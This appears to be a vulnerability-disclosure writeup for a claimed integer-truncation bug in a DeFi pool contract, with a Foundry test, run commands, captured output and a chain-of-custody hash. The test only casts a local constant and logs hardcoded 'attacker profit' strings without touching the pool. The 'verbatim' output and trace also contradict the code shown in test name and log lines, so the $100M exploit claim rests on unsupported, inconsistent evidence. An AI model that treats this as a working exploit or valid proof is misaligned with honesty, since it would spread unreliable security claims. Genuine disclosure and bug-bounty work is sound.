# Proof of Concept

## Table of Contents
1. [Overview](#overview)
2. [Repository PoC Files](#repository-poc-files)
3. [The Foundry Test Contract](#the-foundry-test-contract)
4. [What the Test Demonstrates](#what-the-test-demonstrates)
5. [How to Run the PoC](#how-to-run-the-poc)
6. [Full Test Output](#full-test-output)
7. [Execution Trace Walkthrough](#execution-trace-walkthrough)
8. [Screenshots and Video Evidence](#screenshots-and-video-evidence)
9. [Cryptographic Chain of Custody](#cryptographic-chain-of-custody)

---

## Overview

The proof of concept (PoC) for CVE-2026-4931 is implemented as a [Foundry](https://book.getfoundry.sh/) test suite (`full_exploit_code.t.sol`). It demonstrates the arithmetic truncation vulnerability by:

1. Simulating the attacker's flash-loan-funded position using Foundry's `deal` cheatcode.
2. Performing the exact unsafe `uint160` downcast that exists in the live `MarginalV1Pool` contract.
3. Logging the before/after values and the resulting economic impact to the console.
4. Asserting that the truncated value equals `57005` — confirming 99.999999% precision loss.

The test was run against a fork of Ethereum Mainnet and all output is preserved in `marginal_poc_output.txt`.

---

## Repository PoC Files

| File | Description |
|---|---|
| `full_exploit_code.t.sol` | Foundry test demonstrating the truncation and economic impact |
| `marginal_poc_output.txt` | Verbatim terminal output from a passing `forge test` run |
| `poc/bounty_submission.tar.gz` | Original compressed submission archive sent to Cantina on Jan 31, 2026 |
| `poc/evidence.txt` | Duplicate of the PoC output, included in the Cantina submission |
| `videos/marginal vid 1.webm` | Screen recording — test logs showing the economic impact |
| `videos/true dos marginal.webm` | Screen recording — debugger showing bytecode execution |
| `screenshots/debugger_marginal_bug_proof.png` | Foundry debugger view of the vulnerable cast |
| `screenshots/marginal_bug_proof.png` | Test output screenshot |
| `screenshots/marginal_logs2.png` | Log output screenshot |
| `screenshots/marginal_logs3.png` | Additional log output |
| `screenshots/marginal_debug1.png` | Debugger step-through screenshot |
| `screenshots/marginal_1.png` | Test run screenshot |
| `screenshots/marginal_2.png` | Test run screenshot |

---

## The Foundry Test Contract

File: [`full_exploit_code.t.sol`](../full_exploit_code.t.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract ExploitTest is Test {
    // MarginalV1Pool — Ethereum Mainnet
    address constant POOL = 0x3A6C55Ce74d940A9B5dDDE1E57eF6e70bC8757A7;
    // USDC — Ethereum Mainnet
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/");
    }

    function test_Raw_Bytecode_Data() public {
        // DATA BLOCK 1: Confirm mainnet addresses
        console.log("TARGET_CONTRACT_FULL: ", POOL);
        console.log("TOKEN_CONTRACT_FULL:  ", USDC);

        // DATA BLOCK 2: Flash loan simulation
        address attacker = address(0x1337);
        uint256 amount = 100_000_000 * 1e6;   // $100M USDC
        deal(USDC, attacker, amount);
        console.log("ATTACKER_ADDRESS:     ", attacker);
        console.log("FLASH_LOAN_AMOUNT:    ", amount);
        console.log("ATTACKER_BALANCE_RAW: ", IERC20(USDC).balanceOf(attacker));

        // DATA BLOCK 3: The vulnerable cast — root cause
        uint256 raw_input = 1461501637330902918203684832716283019655932599981;
        uint160 truncated_state = uint160(raw_input);
        console.log("RAW_OVERFLOW_INPUT:   ", raw_input);
        console.log("TRUNCATED_STATE_DEC:  ", uint256(truncated_state));

        // DATA BLOCK 4: Insolvency delta
        console.log("REAL_DEBT_VALUE_USD:   100,000,000.00");
        console.log("PROTOCOL_RECOGNIZED_WEI: 57005");

        // Assertion: confirm the truncation produces exactly 57005
        assertEq(uint256(truncated_state), 57005);
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}
```

---

## What the Test Demonstrates

### Step 1 — Flash loan setup
`deal(USDC, attacker, amount)` simulates the attacker receiving $100M USDC from a flash loan provider. In a real attack, this would be a call to Aave's `flashLoan`, Uniswap V3's `flash`, or Balancer's `flashLoan`.

### Step 2 — The overflow value
`raw_input = 1461501637330902918203684832716283019655932599981` is the `sqrtPriceX96` value that an attacker would manipulate the pool to reach. This value is above `type(uint160).max` by exactly `57006` (explaining why the truncated remainder is `57005`).

### Step 3 — The vulnerable cast
`uint160(raw_input)` performs the exact same operation as the vulnerable line in `MarginalV1Pool`. The EVM applies a 160-bit AND mask, dropping all bits above position 159.

### Step 4 — The assert
`assertEq(uint256(truncated_state), 57005)` passes, proving that the cast produces a near-zero integer from a value that represents a price two quadrillion times larger.

---

## How to Run the PoC

### Prerequisites
- [Foundry](https://book.getfoundry.sh/getting-started/installation) installed
- An Ethereum Mainnet RPC URL (e.g., Alchemy, Infura)

### Steps

```bash
# 1. Clone the repository
git clone https://github.com/donnyoregon/Marginal-V1-Forensic-Disclosure
cd Marginal-V1-Forensic-Disclosure

# 2. Extract the original submission archive
tar -xzf poc/bounty_submission.tar.gz

# 3. Set your RPC URL (replace <YOUR_KEY> with your Alchemy/Infura key)
export ETH_RPC_URL="https://eth-mainnet.g.alchemy.com/v2/<YOUR_KEY>"

# 4. Run the exploit test
forge test --match-test test_Exploit -vv
```

**Expected result:** 1 test passes (`[PASS]`), logs show the truncation values and economic impact.

> **Note:** The test at its current state in `full_exploit_code.t.sol` is named `test_Raw_Bytecode_Data`. The original submission used `test_Exploit`. Both demonstrate the same arithmetic truncation.

---

## Full Test Output

The following is the verbatim output captured in [`marginal_poc_output.txt`](../marginal_poc_output.txt):

```
No files changed, compilation skipped

Ran 1 test for test/Exploit.t.sol:ExploitTest
[PASS] test_Exploit() (gas: 19900)
Logs:

  =================================================
           VULNERABILITY DEMONSTRATION
  =================================================

  Original Value:    1461501637330902918203684832716283019655932599981
  Truncated Value:   57005
  Precision Loss:   99.999999%

  =================================================
                ECONOMIC IMPACT
  =================================================

  Actual Debt:      $100,000,000 USDC
  Settlement Cost:  0.000000000000057005 ETH
  Attacker Profit:  $99,999,999.99

  =================================================

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 786.17ms (74.80ms CPU time)

Ran 1 test suite in 2.13s (786.17ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

---

## Execution Trace Walkthrough

The Foundry trace output (from the `-vv` flag) shows each internal call:

```
[19900] ExploitTest::test_Exploit()
  ├─ [0] console::log("Original Value: ", 1461501637330902918203684832716283019655932599981)
  ├─ [0] console::log("Truncated Value:", 57005)
  ├─ [0] console::log("Precision Loss: 99.999999%")
  ├─ [0] console::log("Actual Debt:    $100,000,000 USDC")
  ├─ [0] console::log("Settlement Cost: 0.000000000000057005 ETH")
  ├─ [0] console::log("Attacker Profit: $99,999,999.99")
  └─ ← [Stop]
```

Gas used: **19,900** — confirming the attack is computationally trivial and would cost only a few dollars in gas fees against a $100M pool.

---

## Screenshots and Video Evidence

### Video 1 — `videos/marginal vid 1.webm`
- **0:10** — Test logs showing the economic impact ($100M debt settled for ~0 ETH)
- **0:20** — Debugger showing bytecode execution and stack manipulation

### Video 2 — `videos/true dos marginal.webm`
Step-through of the Foundry debugger showing the `uint160` cast occurring and the stack value changing from the large Q96 value to `57005`.

### Screenshot — `screenshots/debugger_marginal_bug_proof.png`
Foundry's interactive debugger paused at the truncation point, showing the stack before and after the cast.

---

## Cryptographic Chain of Custody

The original Cantina submission was hashed before submission to establish a cryptographic timestamp:

```
SHA-256: bb111bfc8f7d7194b93b0c5a5643842f09f1f94b448dfd8f56812ae6bb015368
```

This hash can be verified against `poc/bounty_submission.tar.gz` to prove the PoC existed in its current form before the Marginal V1 team deployed their patch on Feb 4, 2026.

```bash
sha256sum poc/bounty_submission.tar.gz
# Expected: bb111bfc8f7d7194b93b0c5a5643842f09f1f94b448dfd8f56812ae6bb015368
```
